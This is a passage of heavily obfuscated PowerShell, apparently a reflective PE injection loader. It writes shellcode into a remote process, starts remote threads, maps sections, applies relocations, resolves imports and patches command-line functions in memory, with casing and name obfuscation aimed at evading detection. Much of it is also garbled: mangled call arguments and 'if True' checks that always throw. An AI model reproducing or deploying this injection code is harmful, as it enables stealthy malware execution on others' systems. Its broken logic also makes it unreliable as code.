   [UIntPtr]${NuMBytEswritten} =  $9HRwny::"zErO"
   ${sUCCesS} = ${wIN32FUNCTIonS}."WRiTepRoCESsmeMoRy"."iNvOkE"(${reMOTeProcHANDLE}, ${rscADdr}, ${sCpSMEMOrIGinal}, [UIntPtr][UInt64]${sclEngTH}, [Ref]${nuMBYteSwRiTTen})
   if ((${SUCcEsS} -eq ${fAlse}) -or ([UInt64]${NUMbYteSWritten} -ne [UInt64]${Sclength}))
   {
    Throw 'Unable to write shellcode to remote process memory.'
   }
 
   ${rThReaDhaNdlE} = &'Create-RemoteThread' -ProcessHandle ${reMOtEpRoCHAnDLe} -StartAddress ${RsCADDr} -Win32Functions ${WIn32fUNCTIONS}
   ${reSulT} = ${wIN32funcTiONs}."wAITForSiNGLEoBJeCT"."inVOkE"' 20000'
   if 'True'
   {
    Throw 'Call to CreateRemoteThread to call GetProcAddress failed.'
   }
 
 
   [IntPtr]${reTuRnVALmEM} =   (&'gEt-CHILDITeM'  'vAriABLE:MlHiT').vAluE::'AllocHGlobal'.Invoke(${PtRSize})
   ${resULt} = ${WiN32FuNCTIoNs}."rEADpROCEsSmEmoRY"."INVOKe"(${RemOtEpROCHaNdLe}, ${GetpROcaDDRESsReTMeM}, ${RETURNValMeM}, [UIntPtr][UInt64]${PtRsIzE}, [Ref]${numbYTEswrItTeN})
   if ((${resUlt} -eq ${FaLSE}) -or (${NuMbyTeSWRITTEN} -eq 0))
   {
    Throw 'Call to ReadProcessMemory failed'
   }
   [IntPtr]${PrOCadDrESS} =  $mLHiT::"ptrtostruCTUre"' System.IntPtr'
 
 
   ${wiN32FunCTioNS}."virtUALFReeeX"."inVoKE"'  0 ' | &'Out-Null'
   ${wIN32fUnCTiOnS}."VirTuALFrEeeX"."InVOkE"'  0 ' | &'Out-Null'
 
         if 'True'
         {
             ${wiN32FUNcTions}."vIRTUaLFrEEeX"."InVoke"'  0 ' | &'Out-Null'
         }
 
   return ${PROCADDREss}
  }
 
 
  Function COpY-sECTioNs
  {
   Param(
   [Parameter(pOsItION = 0, manDAtorY = ${TRUE})]
   [Byte[]]
   ${PEbYTes},
 
   [Parameter(pOsition = 1, MandATORy = ${tRUE})]
   [System.Object]
   ${peINFO},
 
   [Parameter(posITION = 2, MaNdaTory = ${tRue})]
   [System.Object]
   ${WiN32FunctiONS},
 
   [Parameter(pOsItion = 3, maNDatORy = ${tRUE})]
   [System.Object]
   ${wIn32TyPes}
 )
 
   for(${I} = 0; ${i} -lt ${pEInFO}."imAgE_nT_HEaDERs"."FilehEAdER"."nuMbeROfSecTIOnS"; ${I}++)
   {
    [IntPtr]${seCtiONheADerPTR} = [IntPtr](&'Add-SignedIntAsUnsigned' ([Int64]${PEINFO}."SecTiONheadeRPTr") (${I} *   $mLHIT::"Sizeof"([Type]${win32TyPeS}."iMaGe_sEcTiON_HEADer")))
    ${sECTioNHEAdEr} =   (&'DIr' varIablE:mLhit).VALue::"PTRTOStrUCtURe"(${SECTioNHEADERPTR}, [Type]${WIn32typES}."IMage_section_heaDeR")
 
 
    [IntPtr]${SEcTiONDEstADdR} = [IntPtr](&'Add-SignedIntAsUnsigned' ([Int64]${pEinFO}."PehanDLE") ([Int64]${secTioNheADeR}."vIrtUalaDdReSs"))
 
 
 
 
 
    ${SIzEOfRAWDaTa} = ${SEcTiOnHEaDEr}."SizeOfrawdATA"
 
    if (${SeCTiONHeAdER}."POiNTeRtOrAwDatA" -eq 0)
    {
     ${sizeOFRawDATA} = 0
    }
 
    if (${SizeofRAwDAtA} -gt ${SecTIoNhEaDEr}."vIrtuALSIZe")
    {
     ${sizeofRAWDATa} = ${secTIoNHEADEr}."ViRtUALSiZE"
    }
 
    if (${SIzeOFRawDATa} -gt 0)
    {
     &'Test-MemoryRangeValid' -DebugString 'Copy-Sections::MarshalCopy' -PEInfo ${peiNfO} -StartAddress ${seCTiOndesTaDdr} -Size ${siZEOFrAWdAta} | &'Out-Null'
      (&'gEt-ItEM'  'varIablE:mLhIT').vaLue::"coPY"' 0  '
    }
 
 
    if (${SEcTionhEADER}."siZeofRAWDAta" -lt ${sectIonheADer}."virTualsIze")
    {
     ${dIFFereNCe} = ${SEctIONheADER}."VIrtuALSIzE" - ${SIZEofrawData}
     [IntPtr]${sTarTAdDRESs} = [IntPtr](&'Add-SignedIntAsUnsigned' ([Int64]${SEcTIonDestaDdr}) ([Int64]${sIZeOFRAwDATa}))
     &'Test-MemoryRangeValid' -DebugString 'Copy-Sections::Memset' -PEInfo ${PEinFo} -StartAddress ${stArTaDdRESs} -Size ${difFeReNCe} | &'Out-Null'
     ${wiN32fUnCTIoNS}."MemsEt"."InVoke"(${sTARTAddReSS}, 0, [IntPtr]${DifFErence}) | &'Out-Null'
    }
   }
  }
 
 
  Function UpdAtE-memorYADdreSsES
  {
   Param(
   [Parameter(PoSITion = 0, mAndatOrY = ${TRUe})]
   [System.Object]
   ${PEiNFo},
 
   [Parameter(POSItIOn = 1, mAnDAtOrY = ${TRUE})]
   [Int64]
   ${oRIGINalimaGeBASE},
 
   [Parameter(poSItiON = 2, mANDATory = ${trUE})]
   [System.Object]
   ${wiN32CONsTANTS},
 
   [Parameter(PoSitIOn = 3, mAnDAtOry = ${tRuE})]
   [System.Object]
   ${wIN32tYPEs}
 )
 
   [Int64]${bAsedIFfeReNce} = 0
   ${addDIffeReNCE} = ${trUE}
   [UInt32]${ImAgEbASeRElOCsIZE} =  (&('lS')  VARiABLE:MLhIt).vAlue::"sizEOF"([Type]${WiN32TyPEs}."IMAgE_bAsE_reLocAtioN")
 
 
   if ((${ORigiNAlIMAGEBaSE} -eq [Int64]${PEINfO}."EffeCTIVEpehAndLE") 
     -or (${PeiNFo}."iMAGe_NT_heAdeRS"."OPTIOnalHEaDeR"."BaSeRelocaTIoNTabLE"."SizE" -eq 0))
   {
    return
   }
 
 
   elseif ((&'Compare-Val1GreaterThanVal2AsUInt' (${oRIgiNaliMAgeBasE}) (${PEINfo}."eFFecTIVEPeHANdlE")) -eq ${tRUE})
   {
    ${BASeDIFFeRENcE} = &'Sub-SignedIntAsUnsigned' (${OriGINAlImAGEBaSE}) (${pEINfO}."EFFeCTiVepEHaNDLE")
    ${adDdIfFERENCe} = ${falsE}
   }
   elseif ((&'Compare-Val1GreaterThanVal2AsUInt' (${pEiNFO}."eFFecTiVEPEHAnDLe") (${ORIGiNALImAGEbAse})) -eq ${tRUe})
   {
    ${bASEDIFfERenCe} = &'Sub-SignedIntAsUnsigned' (${pEINFO}."EFFeCTivePehANDle") (${ORIgiNaLimageBaSE})
   }
 
 
   [IntPtr]${BaSERELoCptR} = [IntPtr](&'Add-SignedIntAsUnsigned' ([Int64]${PEinFo}."pEHAndLE") ([Int64]${PEINFO}."ImAGE_NT_HeADeRs"."opTIonALhEAdER"."bAserElOCATIONTABLE"."vIrtuALADdreSS"))
   while'True'
   {
 
    ${bASeREloCATIOntABLe} =  $mLHit::"PtRTOsTrUCTURe"' '
 
    if (${BaSEReLOcAtIontablE}."SizeOFblocK" -eq 0)
    {
     break
    }
 
    [IntPtr]${MemadDrBaSe} = [IntPtr](&'Add-SignedIntAsUnsigned' ([Int64]${peINFo}."PeHanDLE") ([Int64]${BaseRelOCATIOnTABLe}."viRtuAlAdDResS"))
    ${nuMReLOCaTIOns} = (${BASeRElOCatioNtAblE}."sIZEoFBLoCK" - ${imAgEBASERELOcSizE}) / 2
 
 
    for(${i} = 0; ${I} -lt ${NUmRelOcAtiOnS}; ${i}++)
    {
 
     ${RElocatIONinFoptR} = [IntPtr](&'Add-SignedIntAsUnsigned' ([IntPtr]${bAseRElOCptr}) ([Int64]${IMAgebaSerelOcSIze} + (2 * ${I})))
     [UInt16]${ReloCATIoNiNFO} =  $mlHiT::"PTrTostrUctuRe"(${ReloCatIoNiNFoptr}, [Type][UInt16])
 
 
     [UInt16]${ReLoCOFfset} = ${relOcAtionInFO} -band 0x0FFF
     [UInt16]${ReloCType} = ${RElOcATionINFo} -band 0xF000
     for (${j} = 0; ${J} -lt 12; ${J}++)
     {
      ${ReLOCTYPE} =  (&'VaRiabLe' '63Y' -VALuEo)::'Floor'.Invoke(${rELoCType} / 2)
     }
 
 
 
 
     if ((${REloCtyPE} -eq ${wiN32cOnsTANTS}."ImAgE_ReL_bASEd_hIGHloW") 
       -or (${RELoCTypE} -eq ${WIN32cONStANTs}."ImaGe_Rel_BAsEd_DIR64"))
     {
 
      [IntPtr]${FiNaLADdR} = [IntPtr](&'Add-SignedIntAsUnsigned' ([Int64]${memADDRBaSe}) ([Int64]${ReLOcoFfSET}))
      [IntPtr]${CUrrADDr} =   $MlhiT::"PTrTostRucTURE"' System.IntPtr'
 
      if (${ADdDIFFEReNCe} -eq ${TrUe})
      {
       [IntPtr]${cuRRAddR} = [IntPtr](&'Add-SignedIntAsUnsigned' ([Int64]${cUrRAddR}) (${BAsEdIfFeReNCe}))
      }
      else
      {
       [IntPtr]${cuRRADdR} = [IntPtr](&'Sub-SignedIntAsUnsigned' ([Int64]${CURRAdDr}) (${BASeDiFFeRENcE}))
      }
 
       (&'vAriABlE' mlhiT  -value)::'StructureToPtr'.Invoke'  False' | &'Out-Null'
     }
     elseif (${rElocTYPE} -ne ${WIN32ConsTaNTs}."IMagE_REl_bASEd_aBsoLUte")
     {
 
      Throw 'Unknown relocation found, relocation value: , relocationinfo: '
     }
    }
 
    ${bASerElOcPTr} = [IntPtr](&'Add-SignedIntAsUnsigned' ([Int64]${BaSERELocPTR}) ([Int64]${baSeRELoCaTIONTABlE}."SizeofBLoCK"))
   }
  }
 
 
  Function IMPoRt-DLlImPOrTS
  {
   Param(
   [Parameter(PosiTION = 0, maNdAtOrY = ${TRue})]
   [System.Object]
   ${peInfo},
 
   [Parameter(PoSition = 1, mANDatorY = ${TRuE})]
   [System.Object]
   ${WIN32fUnCTiONS},
 
   [Parameter(PositION = 2, MaNdAToRy = ${tRUE})]
   [System.Object]
   ${wiN32Types},
 
   [Parameter(PoSItion = 3, MANdaTory = ${trUe})]
   [System.Object]
   ${wIn32ConsTaNTS},
 
   [Parameter(PosiTION = 4, manDaToRy = ${fAlsE})]
   [IntPtr]
   ${ReMoTEprochAndlE}
 )
 
   ${reMOTeLOadiNg} = ${FAlSE}
   if (${PeinFo}."PeHaNDle" -ne ${PeINFO}."eFFEcTiVepeHANdle")
   {
    ${ReMOTeloAdiNG} = ${tRUE}
   }
 
   if (${pEINfo}."IMAGE_nt_hEaDERs"."opTIonALhEadeR"."IMpOrtTABLE"."SIZe" -gt 0)
   {
    [IntPtr]${ImPoRtDescriPtORPTr} = &'Add-SignedIntAsUnsigned' ([Int64]${peiNFO}."PEhaNdle") ([Int64]${peinFo}."IMAgE_Nt_heADERs"."oPTIOnalhEAdER"."imPorTtaBle"."VIRTuaLADDResS")
 
    while 'True'
    {
     ${impORtdeScRiPtor} =  (&'gEt-ItEM'  'VARiAblE:mlhit').VaLUE::"ptRTOSTRUcture"' '
 
 
     if (${ImPortdescriPTor}."CHArAcTeRiSTiCS" -eq 0 
       -and ${IMPoRTDESCrIPToR}."fiRsTthUNK" -eq 0 
       -and ${iMporTdESCriPTOr}."FORwARDercHAiN" -eq 0 
       -and ${iMPoRTdESCRIPTOr}."NAME" -eq 0 
       -and ${ImpoRtdesCRipToR}."TiMeDATestAmP" -eq 0)
     {
      &'Write-Verbose' 'Done importing DLL imports'
      break
     }
 
     ${ImpORtDLlHANDlE} =   (&'DIr'  'vARiaBlE:T2NGf').VAlUe::"zeRO"
     ${iMportDLlpaTHptr} = (&'Add-SignedIntAsUnsigned' ([Int64]${pEINFO}."PEHaNDlE") ([Int64]${ImporTDESCrIptOr}."nAme"))
     ${imPORtDLLpATh} =  (&'vAriAbLe' 'Mlhit').vAlUE::'PtrToStringAnsi'.Invoke(${iMpORTDLLpATHPTr})
 
     if (${RemoteLoADInG} -eq ${tRue})
     {
      ${iMpORtdLlhANDLE} = &'Import-DllInRemoteProcess' -RemoteProcHandle ${RemOTepROChANdlE} -ImportDllPathPtr ${IMPoRtdllpaTHPTR}
     }
     else
     {
      ${IMporTdlLhAnDle} = ${Win32FuNCTioNs}."lOAdlIBrARy"."INVOKE"(${ImPORtdLLPATH})
     }
 
     if 'True'
     {
      throw 'Error importing DLL, DLLName: '
     }
 
 
     [IntPtr]${thuNkrEF} = &'Add-SignedIntAsUnsigned' (${peINFO}."pehANDLE") (${IMporTdESCriPTor}."FiRstThUnk")
     [IntPtr]${ORIgInAlTHUnKrEF} = &'Add-SignedIntAsUnsigned' (${PEinFo}."pEhANDlE") (${imporTDESCRIPtoR}."cHaRaCteRIsticS")
     [IntPtr]${OrIgiNALThunkREfVAl} =   (&'VaRiABLE'  mLhIT).ValUe::"pTRtoSTRUCTuRe"' System.IntPtr'
 
     while (${ORIGINAlTHUNkrefVal} -ne  $t2NGf::"zERO")
     {
                     ${loadByORDINal} = ${fAlSe}
                     [IntPtr]${pROCEdUREnAmePTr} =  (&'geT-VariabLe'  'T2ngf').vAlUe::"zEro"
 
 
 
      [IntPtr]${NewTHUNKREf} =   (&'gEt-ItEm'  'VarIABle:T2NgF').VAlUe::"zERo"
      if((&'GET-VAriABlE' 'MLHIT' -VAlUeO)::"siZeof"'System.IntPtr' -eq 4 -and [Int32]${oRIGiNALThuNKREfvAl} -lt 0)
      {
       [IntPtr]${PRocedURenaMeptr} = [IntPtr]${ORiGinALTHuNKREfval} -band 0xffff
                         ${LoadbyoRDiNAL} = ${trUe}
      }
                     elseif((&'GeT-ChILdITEM' 'VariABlE:mlHit').vALUe::"SIZEof"'System.IntPtr' -eq 8 -and [Int64]${ORigiNalthUNkREfvAL} -lt 0)
      {
       [IntPtr]${pRoCedurEnameptr} = [Int64]${oRIGINaLThUnKReFval} -band 0xffff
                         ${LoADByOrdinaL} = ${TrUe}
      }
      else
      {
       [IntPtr]${STRinGaddr} = &'Add-SignedIntAsUnsigned' (${PeiNFo}."PEhAnDlE") (${ORIGiNALThunkrEFVaL})
       ${StRInGAdDR} = &'Add-SignedIntAsUnsigned' ${sTRinGadDR} ((&'get-vARIaBLe' 'MlHIT'  -VaLuEonl)::"siZeOF"'System.UInt16')
       ${PRoCEduRENaME} =   (&'get-VArIable'  'MLHiT' -valUEonl)::'PtrToStringAnsi'.Invoke(${STRiNGADDr})
                         ${prOcEDUReNAMePTr} =   $mLhiT::'StringToHGlobalAnsi'.Invoke(${pRoCeduRENAMe})
      }
 
      if (${rEMotElOAdING} -eq ${TRue})
      {
       [IntPtr]${nEWTHUnkref} = &'Get-RemoteProcAddress' -RemoteProcHandle ${ReMOtEPROChANdLe} -RemoteDllHandle ${IMPORtdllHaNDLE} -FunctionNamePtr ${pRoceDURenAMEpTr} -LoadByOrdinal ${lOaDbyoRdINAL}
      }
      else
      {
             [IntPtr]${neWTHUNkreF} = ${wIn32FUNcTIonS}."gETpRocaDDrESSinTpTR"."INvOkE"' '
      }
 
      if 'True'
      {
                         if (${loADByorDiNAl})
                         {
                             Throw 'New function reference is null, this is almost certainly a bug in this script. Function Ordinal: . Dll: '
                         }
                         else
                         {
           Throw 'New function reference is null, this is almost certainly a bug in this script. Function: . Dll: '
                         }
      }
 
        (&'geT-ITEM' VaRiaBLE:mLhIT).vaLUe::'StructureToPtr'.Invoke'  False'
 
      ${tHUNkrEF} = &'Add-SignedIntAsUnsigned' ([Int64]${THuNkReF}) ((&'GcI' 'VARIaBle:mlhIT').vAlUE::"sIZEoF"'System.IntPtr')
      [IntPtr]${origInALTHUNKreF} = &'Add-SignedIntAsUnsigned' ([Int64]${ORIgiNAlThUNkReF}) ((&'vArIAbLe' mLHit  -vaLuEONlY)::"SIZEOf"'System.IntPtr')
      [IntPtr]${oRIGiNAlthUnkrEFVal} =  (&'dIR'  'vaRIaBLE:mlhit').vAluE::"ptRTosTRUcTuRE"' System.IntPtr'
 
 
 
                     if ((-not ${LoAdByorDInAL}) -and (${PRocEDUreNAMePTR} -ne   $t2Ngf::"zERO"))
                     {
                           (&('Gi') ("v"+"A"+"rIaB"+"LE"+":mLhIT")).VALUE::'FreeHGlobal'.Invoke(${PRocedUrEnAMEPTR})
                         ${proceDURenaMEptR} =  (&'gET-variAble'  t2nGF -VAluEo)::"ZeRo"
                     }
     }
 
     ${iMpORtDEScRiPTORpTr} = &'Add-SignedIntAsUnsigned' (${IMPoRtDEscRiPTORpTr}) ((&'GET-VARiabLe'  MLhIt).value::"sIzEoF"([Type]${win32typEs}."ImaGE_IMPorT_DeScRIpTor"))
    }
   }
  }
 
  Function geT-VirTUalPROTEcTvaluE
  {
   Param(
   [Parameter(POSitIOn = 0, mandATORy = ${tRue})]
   [UInt32]
   ${SecTionchArACteRiSTiCs}
 )
 
   ${pROTECtiONfLAg} = 0x0
   if ((${sEctiONChARACTeRISTICs} -band ${WiN32conSTANTS}."ImAGE_ScN_MeM_exEcUte") -gt 0)
   {
    if ((${SeCtiONcHARaCtErISticS} -band ${wIN32cONStAnTS}."IMaGe_scN_MEm_ReAD") -gt 0)
    {
     if ((${SecTioNCHARActeRISTiCS} -band ${Win32conSTAnts}."imAge_SCN_mem_WRITE") -gt 0)
     {
      ${pROTeCtiONFlAG} = ${wIN32ConsTAnTs}."pAgE_ExeCuTE_ReAdwriTe"
     }
     else
     {
      ${pROtecTIONfLaG} = ${win32cOnSTANtS}."pAge_ExecUte_ReAd"
     }
    }
    else
    {
     if ((${sECTionChArACTeriSTics} -band ${WIN32consTANTs}."IMAGE_SCN_mEM_wrITe") -gt 0)
     {
      ${protEcTIONFlAG} = ${wiN32cOnstaNts}."Page_exeCute_WRIteCOpY"
     }
     else
     {
      ${ProtectIONFLAG} = ${Win32CoNStANts}."PagE_eXECUTe"
     }
    }
   }
   else
   {
    if ((${sECtIOnChARAcTeriSTicS} -band ${WiN32CONsTaNTs}."IMAGE_scn_mem_reAd") -gt 0)
    {
     if ((${SecTIoNChaRacteRIstiCs} -band ${WiN32cONstANTs}."ImAge_ScN_Mem_WRiTE") -gt 0)
     {
      ${prOTeCtIoNflAG} = ${WIN32coNstAnTS}."pAGE_REAdWRItE"
     }
     else
     {
      ${PROtECtIOnflAg} = ${wIn32COnSTaNts}."PaGe_reADOnly"
     }
    }
    else
    {
     if ((${SEcTIONChARACTErisTIcS} -band ${wIN32CoNsTAnTs}."IMAGE_sCN_mEM_WRIte") -gt 0)
     {
      ${PrOTEcTioNfLAg} = ${WIN32CONStaNTS}."PAgE_wRItECOPY"
     }
     else
     {
      ${prOTECtIonFlag} = ${wIN32coNsTanTS}."pAGe_noaCCeSS"
     }
    }
   }
 
   if ((${sECTIonChARACTERiStiCS} -band ${wIn32coNsTANtS}."imaGE_sCN_MEM_nOt_cACHed") -gt 0)
   {
    ${PRotECtioNflag} = ${prOtECtioNfLAG} -bor ${WIN32cONSTanTS}."PAgE_nOCAChE"
   }
 
   return ${ProtECtiOnFlAG}
  }
 
  Function UPDATE-mEMOrYpROTEcTioNFlAgs
  {
   Param(
   [Parameter(pOsItioN = 0, mANdAtoRy = ${TrUe})]
   [System.Object]
   ${PEInFO},
 
   [Parameter(posItIoN = 1, maNDAtory = ${TrUe})]
   [System.Object]
   ${wIN32FuNcTionS},
 
   [Parameter(poSITION = 2, mANdATOry = ${TRuE})]
   [System.Object]
   ${WiN32cOnSTANTS},
 
   [Parameter(PosiTion = 3, MandATory = ${TRue})]
   [System.Object]
   ${WiN32TYPEs}
 )
 
   for(${I} = 0; ${i} -lt ${PEInFo}."ImAge_NT_hEadERS"."fileHeAder"."nUmbErOFSEcTIoNs"; ${I}++)
   {
    [IntPtr]${sECtiONheADeRpTR} = [IntPtr](&'Add-SignedIntAsUnsigned' ([Int64]${PEINFo}."SeCTioNHEADeRpTR") (${I} *  $MLhIT::"sizeOf"([Type]${wIN32TypeS}."ImAGE_secTIOn_heAder")))
    ${seCtIoNheADeR} =   $mlHiT::"PTrtOSTRuCTuRE"(${seCTIonHeAderPTR}, [Type]${WIn32tYpes}."imAGe_SeCTioN_HeAdEr")
    [IntPtr]${secTIoNpTr} = &'Add-SignedIntAsUnsigned' (${PEiNfO}."PehANdlE") (${SeCTiOnhEADER}."vIRTUalAddRESS")
 
    [UInt32]${PrOTeCTFlaG} = &'Get-VirtualProtectValue' ${SEcTiONHEaDER}."CHaRActERiSTics"
    [UInt32]${seCTionsize} = ${SecTiOnHeADeR}."virTuALSiZe"
 
    [UInt32]${OldproTecTFlaG} = 0
    &'Test-MemoryRangeValid' -DebugString 'Update-MemoryProtectionFlags::VirtualProtect' -PEInfo ${peinfo} -StartAddress ${SECTiONpTR} -Size ${secTIonSize} | &'Out-Null'
    ${suCCESS} = ${win32FUNcTiONS}."viRtUALprOTEcT"."INVOKE"(${sEcTIoNpTr}, ${seCTIONSIze}, ${PrOTeCTFLAG}, [Ref]${oldpROtecTflag})
    if (${sUCCESs} -eq ${falSe})
    {
     Throw 'Unable to change memory protection'
    }
   }
  }
 
 
 
  Function UpDATe-ExEFUNcTIOnS
  {
   Param(
   [Parameter(PoSItiON = 0, mANDATOrY = ${TRue})]
   [System.Object]
   ${PeINFo},
 
   [Parameter(PosiTIoN = 1, MAndATORY = ${tRUE})]
   [System.Object]
   ${win32fUNcTions},
 
   [Parameter(pOSItIoN = 2, MAnDaTOrY = ${trUE})]
   [System.Object]
   ${wiN32COnSTAnTS},
 
   [Parameter(pOsItIoN = 3, MaNDAtORY = ${tRUE})]
   [String]
   ${ExEARguMENts},
 
   [Parameter(PoSITIoN = 4, MAnDAtOrY = ${TRUE})]
   [IntPtr]
   ${ExeDoNEbyTEPTR}
 )
 
 
   ${rETURnArRAy} = @()
 
   ${PtrsIzE} =   (&('gI')  VARiabLe:MlhIt).vAlUE::"sIZEoF"'System.IntPtr'
   [UInt32]${OLdProtecTflaG} = 0
 
   [IntPtr]${kErNel32HanDlE} = ${WIn32FUNcTIoNS}."gEtMoDulEhandle"."INvoKE"('Kernel32.dll')
   if 'True'
   {
    throw 'Kernel32 handle null'
   }
 
   [IntPtr]${keRNelbaSEhaNDle} = ${WIN32fUnCtiONs}."GETmOdULeHANDLE"."INvoke"'KernelBase.dll'
   if 'True'
   {
    throw 'KernelBase handle null'
   }
 
 
 
 
   ${cmDliNEWArgsPTr} =  $MlhIt::'StringToHGlobalUni'.Invoke(${eXearGUmeNTS})
   ${cmdliNeAARgSpTr} =  $MLhIT::'StringToHGlobalAnsi'.Invoke(${eXEArGUmEnTs})
 
   [IntPtr]${GETcOMmanDlINEAADDr} = ${wiN32FUNcTIoNS}."GETProCAddREss"."INVOKE"' GetCommandLineA'
   [IntPtr]${gEtComMANdLinewADdR} = ${WIN32fUNcTIoNs}."geTProCaddReSS"."INvOkE"' GetCommandLineW'
 
   if 'True'
   {
    throw "GetCommandLine ptr null. GetCommandLineA: $(Get-Hex $GetCommandLineAAddr). GetCommandLineW: $(Get-Hex $GetCommandLineWAddr) "
   }
 
 
   [Byte[]]${SHelLCOdE1} = @()
   if (${ptrsIZE} -eq 8)
   {
    ${SheLLCOde1} += 0x48
   }
   ${SHeLlcode1} += 0xb8
 
   [Byte[]]${sHeLLCode2} = @(0xc3)
   ${totALsIZE} = ${SheLlcODE1}."LENgTh" + ${PTrsizE} + ${shEllCoDe2}."LEnGTH"
 
 
 
   ${GetcOMManDLIneAORIGBYtESPtR} =   $mLHIt::'AllocHGlobal'.Invoke(${ToTALSize})
   ${GEtcoMMaNdLiNeWoRIGByTEsptr} =   $MlHit::'AllocHGlobal'.Invoke(${ToTalsiZE})
   ${WiN32FuNctIOnS}."MEMcPY"."InVokE"'  0' | &'Out-Null'
   ${WIN32FuncTioNs}."mEmCpy"."InVoKe"'  0' | &'Out-Null'
   ${reTUrNArrAy} += ,'  '
   ${REturnaRRAY} += ,'  '
 
 
   [UInt32]${OLDPROTeCTFlaG} = 0
   ${sUccEss} = ${WiN32FunCTIONS}."vIrTUAlpRotECT"."InvOke"(${GetCommAnDlINeaAddR}, [UInt32]${tOTalSIzE}, [UInt32](${wIN32CoNsTaNTs}."pAgE_eXeCUTe_READWRItE"), [Ref]${oldPROTeCTflAg})
   if (${SUcCesS} = ${FalSe})
   {
    throw 'Call to VirtualProtect failed'
   }
 
   ${geTCOMMAndLINeaAddRTEMP} = ${GetCoMmANDlINEAADdr}
   &'Write-BytesToMemory' -Bytes ${shellcode1} -MemoryAddress ${geTcomMANDLiNeAADDRtEMp}
   ${gETCOmmaNDLIneAADDrTEmP} = &'Add-SignedIntAsUnsigned' ${GETCommaNdlinEAAdDrteMP} (${shelLCODE1}."LEnGth")
    $mLHit::'StructureToPtr'.Invoke'  False'
   ${GeTCOmMAndlINEaaddrTEmP} = &'Add-SignedIntAsUnsigned' ${GETcommANdlinEAAdDrtemP} ${PTRSIZE}
   &'Write-BytesToMemory' -Bytes ${SHElLcOde2} -MemoryAddress ${gETcoMmAndLINEAaDdRTEmP}
 
   ${wIN32FuNcTIONS}."vIRtUALPRotECt"."inVOKE"(${GEtcOmmANDlInEaAdDr}, [UInt32]${tOTalsiZe}, [UInt32]${oLdPROTecTflaG}, [Ref]${oLDProTECTFLAG}) | &'Out-Null'
 
 
 
   [UInt32]${oldPROtEctfLag} = 0
   ${sUCCESs} = ${WiN32fUNctioNS}."viRTUalPrOTECT"."iNVOke"(${gETCOMMaNDlInEwaDdr}, [UInt32]${toTAlSize}, [UInt32](${WIN32ConsTAntS}."pagE_ExeCUTE_REAdWrITe"), [Ref]${OLdPROtecTfLaG})
   if (${sucCeSS} = ${FALsE})
   {
    throw 'Call to VirtualProtect failed'
   }
 
   ${GeTCOMMaNDLInEWAddRTeMp} = ${gETcoMMaNDLINEWADDr}
   &'Write-BytesToMemory' -Bytes ${SHellcoDE1} -MemoryAddress ${gETcOMMANdlInEwADDrTemP}
   ${GeTComMaNdlINEWadDRtEmP} = &'Add-SignedIntAsUnsigned' ${geTCOMMAndLiNeWADDRTEMP} (${ShEllCode1}."leNGTH")
     (&'ITem' 'varIABle:MlHIt').ValUe::'StructureToPtr'.Invoke'  False'
   ${gEtCOmmAndlInEWAdDRTeMP} = &'Add-SignedIntAsUnsigned' ${gEtCOMmaNdliNEWadDRTeMP} ${pTRSize}
   &'Write-BytesToMemory' -Bytes ${sHELlCODE2} -MemoryAddress ${GETCoMmANdLINEwadDRTeMp}
 
   ${WIN32fUNcTIons}."vIRTUalproteCt"."iNvOkE"(${gEtCOmMandLInEwAdDR}, [UInt32]${totalSiZe}, [UInt32]${oLDprOTEcTFLAG}, [Ref]${oLdproTECtFlaG}) | &'Out-Null'
 
 
 
 
 
 
 
 
   ${DLlLisT} = @('msvcr70d.dll', 'msvcr71d.dll', 'msvcr80d.dll', 'msvcr90d.dll', 'msvcr100d.dll', 'msvcr110d.dll', 'msvcr70.dll' 
    , 'msvcr71.dll', 'msvcr80.dll', 'msvcr90.dll', 'msvcr100.dll', 'msvcr110.dll')
 
   foreach (${dLL} in ${dLLLIST})
   {
    [IntPtr]${DllhANDlE} = ${WIn32fUNCtiONs}."getMOdUleHAnDle"."InVOkE"(${DlL})
    if (${dLLhandLe} -ne   $t2NGF::"zeRo")
    {
     [IntPtr]${WcmDlNADdr} = ${Win32fUNctiONS}."GeTpROCaDdResS"."invOkE"(${DLlhANdLE}, '_wcmdln')
     [IntPtr]${AcMDLnAddR} = ${WIn32FuncTIOnS}."getProcAdDResS"."INVoKe"' _acmdln'
     if 'True'
     {
      'Error, couldn't find _wcmdln or _acmdln'
     }
 
     ${NEWACMdLNptR} =   (&('GI')  VaRiable:MlhIT).vAlUE::'StringToHGlobalAnsi'.Invoke(${EXeArGUmENTs})
     ${NeWWcmdlNpTr} =   (&'Get-itEM' 'variablE:mLhIT').ValUe::'StringToHGlobalUni'.Invoke(${ExEarGuMEnTs})
 
 
     ${ORIGAcmdLnpTr} =  $MlHIT::"pTRTOSTrUcTUrE"' System.IntPtr'
     ${ORIgwCmDLNptR} =   $MlhiT::"PTRtOstRuctuRE"' System.IntPtr'
     ${ORiGaCMdLNpTrSTOrAge} =  $MLhiT::'AllocHGlobal'.Invoke(${PtRSIze})
     ${ORIGwCmDLNpTRSTORAGE} =   (&'get-childIteM'  vARIABLe:mlHiT).VaLuE::'AllocHGlobal'.Invoke(${PTRsiZe})
      (&'GEt-VaRiABLe' 'MLhit').valUE::'StructureToPtr'.Invoke'  False'
      (&'gET-ItEm' 'vaRIAbLE:MlhIT').vAlue::'StructureToPtr'.Invoke'  False'
     ${REtURNarrAY} += ,'  '
     ${REtuRnARrAY} += ,'  '
 
     ${SuCcess} = ${WIN32fUnCtIONS}."virTuAlPRoTect"."INVokE"(${acMDLNADDR}, [UInt32]${pTRSIZe}, [UInt32](${wiN32CONStAntS}."PaGe_EXeCUTe_rEaDwRiTE"), [Ref]${oLDpRoTeCtFlaG})
     if (${sUCCESs} = ${falSe})
     {
      throw 'Call to VirtualProtect failed'
     }
       $MLHit::'StructureToPtr'.Invoke'  False'
     ${wiN32FuNctions}."VIRTuALpRoTEct"."iNVoke"(${AcmDLNAddR}, [UInt32]${ptRSiZe}, [UInt32](${oLdpRoTeCTfLAg}), [Ref]${oLDPRoteCTfLag}) | &'Out-Null'
 
     ${sUccEss} = ${wIN32fuNctIONS}."VirTUaLPROTecT"."iNVOKE"(${wcmDLNAddr}, [UInt32]${pTRSIze}, [UInt32](${win32cONSTANtS}."PaGe_exeCUte_ReADWrite"), [Ref]${oLdpROTecTfLag})
     if (${SUcceSs} = ${FALse})
     {
      throw 'Call to VirtualProtect failed'
     }
       $mLHIt::'StructureToPtr'.Invoke'  False'
     ${wIN32fUnctIONS}."vIrTUaLprotEct"."invoKe"(${WcmDLnadDr}, [UInt32]${pTrsIzE}, [UInt32](${OLdPROtECtFlaG}), [Ref]${olDPRotECTFLAG}) | &'Out-Null'
